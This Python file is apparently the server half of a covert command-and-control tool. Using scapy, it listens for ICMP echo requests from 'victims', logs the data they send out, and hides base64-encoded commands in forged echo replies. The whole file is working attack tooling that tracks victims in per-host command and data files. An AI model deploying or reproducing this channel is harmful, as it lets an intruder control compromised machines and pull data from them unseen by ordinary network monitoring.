from scapy.all import sniff,send,IP,ICMP
from pathlib import Path
import base64
import json
import sys
import os

def prepare_environment():
    path = Path(f"{os.getcwd()}/Victims/")

    Path(f"{path}/Commands/").mkdir(parents=True, exist_ok=True)
    Path(f"{path}/Data/").mkdir(parents=True, exist_ok=True)

    return Path(path)

def add_victim(victim_name, path):
    if(victim_name.find("/") == -1 or victim_name.find("\\") == -1):
        Path(f"{path}/Commands/{victim_name}.txt").open(mode="a").close()
        Path(f"{path}/Data/{victim_name}.txt").open(mode="a").close()

def get_victim_command(victim_name, path):
    file = Path(f"{path}/Commands/{victim_name}.txt").open(mode="r")
    content = file.read().strip()
    file.close()
    
    if(content):
        command = f"c:{base64.b64encode(content.encode('ascii')).decode('utf-8')}"
        Path(f"{path}/Commands/{victim_name}.txt").open(mode="w").close()  # to clear the command file after issuing commands
        return command
        
    return ""

def deserialize_json(json_object):
    message = json.loads(json_object)
    return message
        
def handle_load(load, path, sender_ip):
    deserialized_load = deserialize_json(load)
    victim_name = deserialized_load["h"]
    add_victim(victim_name, path)

    if("h" not in deserialized_load.keys()):
        return ""

    if("d" in deserialized_load.keys()):
        # print(f"\ndata packet from {victim_name}[{sender_ip}] received")
        # print(f"data received: {deserialized_load['d']}")
        print(deserialized_load["d"])

    else:
        print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
        command = get_victim_command(victim_name, path)
        print(f"sent command: {command}")
        return command

    return ""

def handle_ping(pkt):
    path = prepare_environment()

    if (pkt[2].type == 8):
        try:
            dst=pkt[1].dst
            src=pkt[1].src
            seq=pkt[2].seq
            id=pkt[2].id
            load = pkt[3].load.decode('UTF-8')
            command = handle_load(load, path, src)
            if(command):
                reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/command
                send(reply,verbose=False)
        except:
            pass

if __name__=="__main__":
    
    if(len(sys.argv) != 2):
        print(f"Invalid arguments provided")
        print(f"USAGE: python3 {sys.argv[0]} <network interface>\n")
        sys.exit()

    iface = sys.argv[1]
    path = prepare_environment()
    sniff(iface=iface, prn=handle_ping, filter="icmp and icmp[0]=8")